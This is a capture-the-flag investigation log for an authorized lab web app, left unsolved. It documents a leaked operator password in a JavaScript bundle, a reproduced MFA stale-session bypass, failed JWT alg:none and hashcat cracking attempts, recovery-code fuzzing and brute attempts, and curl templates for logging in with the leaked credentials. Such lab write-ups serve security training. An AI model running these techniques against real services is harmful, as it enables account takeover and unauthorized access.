# Northstar Cloud MFA Lab — Active Investigation

**Date:** 2026-07-10  
**Target type:** PwnBox lab (authorized)  
**Theme:** MFA added to operations workspace — does auth protect privileged production access?  
**Goal:** `pwnbox{...}` from `POST /api/legacy/releases/smoke-test`  
**Status:** **NOT SOLVED** — admin session for Maya not obtained

## Instances tested

| Instance ID | URL | Status |
|-------------|-----|--------|
| `fcc0912bc60f` | https://fcc0912bc60f.pwnbox-lab.com/ | Expired |
| `8b0dcb20e263` | https://8b0dcb20e263.pwnbox-lab.com/ | Expired |
| `9f4dd55ef8b4` | https://9f4dd55ef8b4.pwnbox-lab.com/ | Expired |
| **`81306254c3e8`** | https://81306254c3e8.pwnbox-lab.com/ | **Alive** (last confirmed) |

---

## Confirmed attack surface

### 1. Legacy credential leak (confirmed)

`/assets/legacy/release-admin.41c8.js` exposes operator credentials:

```javascript
const legacyReleaseConfig = {
  apiBase: "/api/legacy/releases",
  region: "eu-central-1",
  smokeTestOperator: {
    email: "maya.chen@northstar.local",
    password: "Orbit-Saffron-47!"
  }
};
```

### 2. Runtime / source map metadata (confirmed)

- `/assets/app.91bd2.js.map` — sources: `navigation.ts`, `config/runtime.ts`, `config/legacy.ts`
- Runtime config: `apiBase: '/api'`, `release: '2026.06.14-73fd9'`, `region: 'eu-central-1'`
- `legacyConsoleEnabled = false` (legacy bundle retained for rollback validation)
- `/assets/runtime.2c91a.js` — `window.__NORTHSTAR__` with same release/region/apiBase
- Client JS (`app.91bd2.js`) only handles nav + theme toggle — **no recovery-code client logic**

### 3. Auth model (confirmed)

- Cookie: `session` — JWT HS256
- JWT claims: `sub`, `twoFactorVerified`, `iat`, `exp` — **no role in JWT**
- `GET /api/session` → `{"user":{email,name,role},"mfaVerified":bool}` — role from DB
- Register/login: form POST (`application/x-www-form-urlencoded`)

---

## Confirmed: MFA stale-session bypass

**Bug class:** MFA state / session token desync

### Reproduction

1. Register → session with `twoFactorVerified: false`
2. Enable MFA at `/settings/security/mfa/setup` + POST `/settings/security/mfa/enable`
3. Session re-issued but JWT still has **`twoFactorVerified: false`**
4. `/api/session` shows `"mfaVerified": false` while UI shows MFA **Enabled**
5. Login again → redirect to `/auth/mfa?challenge=<24-hex>` but **old bypass session persists**
6. Can access `/app` (HTTP 200) before completing MFA verify

### Evidence (instance `81306254c3e8`)

```
POST /login (after MFA enable) → 302 /auth/mfa?challenge=...
GET /api/session → mfaVerified:false, role:member
GET /app → 200
JWT payload → twoFactorVerified:false
```

After completing `/auth/mfa/verify` with valid TOTP:

- JWT → `twoFactorVerified: true`
- `/api/session` → `mfaVerified: true`

### MFA enable response

- HTTP 302 → `/settings/security`
- Only `Set-Cookie: session=...` — no recovery codes in headers/body
- Empty response body on enable POST

---

## Confirmed: Production sink — smoke-test

**Endpoint:** `POST /api/legacy/releases/smoke-test`  
**Body:** `{"email":"maya.chen@northstar.local","password":"Orbit-Saffron-47!"}`

| Condition | Result |
|-----------|--------|
| No session | **401** `{"error":"authentication_required"}` |
| Member session (stale OR MFA-verified) | **404** `Not found` |
| Member + Maya creds in body | **404** |
| Member + own creds in body | **404** |
| Empty body `{}` with member session | **404** |

**Likely logic:** session required + server-side role lookup via `sub` → must be **admin** (Maya). Body creds alone do not substitute for role.

---

## Confirmed: Maya login flow

```
POST /login email=maya.chen@northstar.local password=Orbit-Saffron-47!
→ 302 /auth/mfa?challenge=<24-hex>
→ NO session cookie until MFA verify completes
```

Unlike self-registered MFA users, Maya does **not** retain a stale pre-MFA session on login.

---

## Confirmed: MFA verify parameters

**Endpoint:** `POST /auth/mfa/verify?challenge=<id>`

| Payload | Result |
|---------|--------|
| `code=<6-digit TOTP>` | 401 Incorrect authentication code (wrong code) / 302 /app (correct) |
| `code=<8-digit numeric>` | 401 Incorrect authentication code |
| **`use_recovery=1&code=<8-char>`** | 401 Incorrect (wrong code) — **param accepted** |
| Alphanumeric codes without `use_recovery=1` | 400 invalid/expired challenge |
| `bypass=1` | 429 rate limit (param recognized) |

Recovery login works in principle via `use_recovery=1&code=<8-char-code>` — Maya's codes **not found**.

---

## Recovery codes UI (confirmed, view route unknown)

After MFA enable, `/settings/security` shows:

```html
<h2>Recovery codes</h2>
<p>Recovery codes become available after MFA is enabled.</p>
<span class="muted">Not viewed</span>
```

- No href, no form, no click handler in JS
- CSS defines `.secret-panel` for displaying codes — template exists server-side
- **No route found** that returns `secret-panel` HTML despite exhaustive fuzzing

### Recovery paths tested (all 404 with auth)

- `/settings/security/recovery-codes`, `/view`, `/show`, `/reveal`, `/download`, `/generate`
- `/settings/security/mfa/recovery-codes`, `/backup-codes`, `/recovery`
- `/api/recovery-codes`, `/api/mfa/recovery-codes`, `/api/session/recovery-codes`
- POST `/settings/security` with action/view/password params
- Query params on `/settings/security` (`?view=recovery`, `?recovery=1`, etc.)
- Accept: application/json, X-Requested-With: XMLHttpRequest
- Permutation fuzz under `/settings/security/` (common.txt words)
- Case variants, underscores, camelCase

---

## JWT analysis (confirmed failures)

- Structure: HS256, claims `sub`, `twoFactorVerified`, `iat`, `exp`
- **Failed:** alg:none / None / NONE
- **Failed:** ~50+ targeted secrets (release string, region, Maya password, instance ID, hashes)
- **Failed:** hashcat -m 16500 on ~10k wordlist + custom northstar list
- **Failed:** register with `role=admin` → still `member`
- **Failed:** PATCH/PUT/POST `/api/session` → 404

---

## Other tests ruled out

| Attack | Result |
|--------|--------|
| JWT HS256 crack (10k + targeted) | No match |
| smoke-test + legacy headers (`X-Legacy-Console-Enabled`, etc.) | 404 |
| smoke-test + Basic auth combos | 404 |
| Profile email change to Maya | POST 404 / fields disabled |
| Register as `maya.chen@northstar.local` | Blocked / no session |
| `maya..chen@northstar.local` register | Redirect /app but auth_required |
| Session confusion (member cookie + Maya login) | Member session persists |
| Member TOTP on Maya challenge | 401 |
| Cross-user session upgrade to Maya | Failed |
| robots.txt custom Disallow /backups/ | Not present (unlike Portal lab variant) |
| `/backups/*` paths | 302 → login or Not found (not open listing) |
| SQLi on login | No bypass |
| Maya TOTP derived from password/email/instance | Failed |
| Common recovery codes brute on Maya challenge | 401 / 429 |
| Password reset routes | 404 |
| Only real JSON API with session | `GET /api/session` → 200 |

---

## API discovery notes

Many `/api/*` paths return:

- **401** without cookie (auth middleware catch-all)
- **404** with valid member cookie (route doesn't exist)

Do **not** treat 401-without-auth as proof an endpoint exists.

**Only confirmed authenticated API route:** `GET /api/session`

---

## Intended exploit chain (likely, unconfirmed final step)

```
Source map / legacy JS → Maya creds
  → Obtain Maya ADMIN session via one of:
      A) Recovery codes view route + use_recovery login
      B) JWT forge (sub=maya.chen@northstar.local, twoFactorVerified:false)
      C) Complete Maya TOTP (secret unknown)
  → POST /api/legacy/releases/smoke-test with Maya body creds
  → flag
```

**Hypothesis:** smoke-test checks server-side `role=admin` via session `sub` lookup. Stale `twoFactorVerified:false` bypass may matter for legacy path but still needs admin role.

### Commands once Maya admin session obtained

```bash
BASE="https://81306254c3e8.pwnbox-lab.com"
curl -sS -b maya.jar -X POST "$BASE/api/legacy/releases/smoke-test" \
  -H "Content-Type: application/json" \
  -d '{"email":"maya.chen@northstar.local","password":"Orbit-Saffron-47!"}'
```

### Recovery login template (once codes known)

```bash
CH=$(curl -sS -i -X POST "$BASE/login" \
  -d "email=maya.chen@northstar.local&password=Orbit-Saffron-47!" \
  | grep -oP 'challenge=\K[a-f0-9]+')

curl -sS -c maya.jar -b maya.jar -X POST \
  "$BASE/auth/mfa/verify?challenge=$CH" \
  -d "use_recovery=1&code=<RECOVERY_CODE>"
```

---

## Test accounts (instance `81306254c3e8`)

Disposable curl accounts created during testing (password `Testpass123!` unless noted):

- `browser813@test.local` — browser session, MFA enabled
- `fresh1783707861@test.local`, `full1783707861@test.local`, `flow1783708022@test.local`, etc.

Maya (from leak): `maya.chen@northstar.local` / `Orbit-Saffron-47!`

---

## Next moves (when instance alive)

1. **Find recovery-code view route** — highest ROI; UI shows "Not viewed" + `.secret-panel` CSS
2. **JWT secret** — hashcat with rockyou / larger wordlists; instance-specific combos
3. **Backup paths with auth** — `/backups/*` returns 302, not fully explored with admin session
4. **Browser network capture** on security page after MFA enable

---

## Related (different lab variant)

Portal lab writeup: `writeups/northstar-portal-robots-backup-leak.md` — robots.txt → `/backups/` open listing. **Not applicable** to MFA variant (no custom robots Disallow, backups not openly listed).
